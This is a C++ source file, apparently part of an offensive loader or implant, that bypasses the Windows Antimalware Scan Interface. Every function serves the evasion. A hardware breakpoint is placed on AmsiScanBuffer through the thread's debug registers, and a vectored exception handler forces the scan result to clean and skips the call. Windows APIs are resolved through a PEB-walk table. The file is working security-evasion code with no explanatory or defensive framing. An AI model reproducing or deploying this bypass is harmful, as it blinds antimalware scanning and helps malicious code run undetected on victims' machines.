#include "amsi.h"
#include "peb_walk.h"

static void* s_amsi_addr = nullptr;
static void* s_veh_handle = nullptr;

static LONG NTAPI amsi_hwbp_handler(PEXCEPTION_POINTERS exc) {
    if (exc->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    if (reinterpret_cast<void*>(exc->ContextRecord->Rip) != s_amsi_addr)
        return EXCEPTION_CONTINUE_SEARCH;

    DWORD64* stack = reinterpret_cast<DWORD64*>(exc->ContextRecord->Rsp);

    int* result_ptr = reinterpret_cast<int*>(stack[6]);
    if (result_ptr) *result_ptr = 0;

    exc->ContextRecord->Rax = 0x80070057;
    exc->ContextRecord->Rip = stack[0];
    exc->ContextRecord->Rsp += 8;
    exc->ContextRecord->Dr6 = 0;

    return EXCEPTION_CONTINUE_EXECUTION;
}

bool patch_amsi_bypass() {
    s_amsi_addr = reinterpret_cast<void*>(g_apis.pAmsiScanBuffer);
    if (!s_amsi_addr) return false;

    s_veh_handle = g_apis.pAddVectoredExceptionHandler(
        1, reinterpret_cast<PVECTORED_EXCEPTION_HANDLER>(amsi_hwbp_handler));
    if (!s_veh_handle) return false;

    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    HANDLE hThread = g_apis.pGetCurrentThread();

    if (!g_apis.pGetThreadContext(hThread, &ctx)) {
        g_apis.pRemoveVectoredExceptionHandler(s_veh_handle);
        s_veh_handle = nullptr;
        return false;
    }

    ctx.Dr0 = reinterpret_cast<DWORD64>(s_amsi_addr);
    ctx.Dr6 = 0;
    ctx.Dr7 = (ctx.Dr7 & ~(3ULL << 16 | 3ULL << 18 | 3ULL)) | 1ULL;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!g_apis.pSetThreadContext(hThread, &ctx)) {
        g_apis.pRemoveVectoredExceptionHandler(s_veh_handle);
        s_veh_handle = nullptr;
        return false;
    }

    return true;
}

void restore_amsi_bypass() {
    if (!s_veh_handle) return;

    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    HANDLE hThread = g_apis.pGetCurrentThread();

    if (g_apis.pGetThreadContext(hThread, &ctx)) {
        ctx.Dr0 = 0;
        ctx.Dr6 = 0;
        ctx.Dr7 &= ~1ULL;
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        g_apis.pSetThreadContext(hThread, &ctx);
    }

    g_apis.pRemoveVectoredExceptionHandler(s_veh_handle);
    s_veh_handle = nullptr;
    s_amsi_addr = nullptr;
}
